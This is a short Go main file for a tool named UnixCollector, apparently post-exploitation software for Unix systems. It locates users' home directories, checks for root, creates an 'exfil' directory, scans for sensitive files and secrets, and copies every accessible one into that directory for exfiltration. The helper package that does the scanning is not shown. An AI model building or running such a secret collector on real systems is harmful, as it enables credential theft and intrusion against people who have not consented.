package main

import (
	"UnixCollector/internals"
	"fmt"
)

func main() {
	fmt.Println("[+] UnixCollector Started")

	usersHome, isRoot := internals.GetUsersHomedir()
	// debugging
	// fmt.Println(usersHome)
	// fmt.Println(isRoot)
	exfilDirectory := internals.GetExfilDirectory()
	fmt.Println(exfilDirectory)

	secrets := internals.ScanSensitiveFiles(exfilDirectory, usersHome, isRoot)
	accessibleFiles := internals.FilterExistingFiles(secrets)
	// fmt.Println(accessibleFiles)
	internals.CopyFiles(accessibleFiles, exfilDirectory)
}
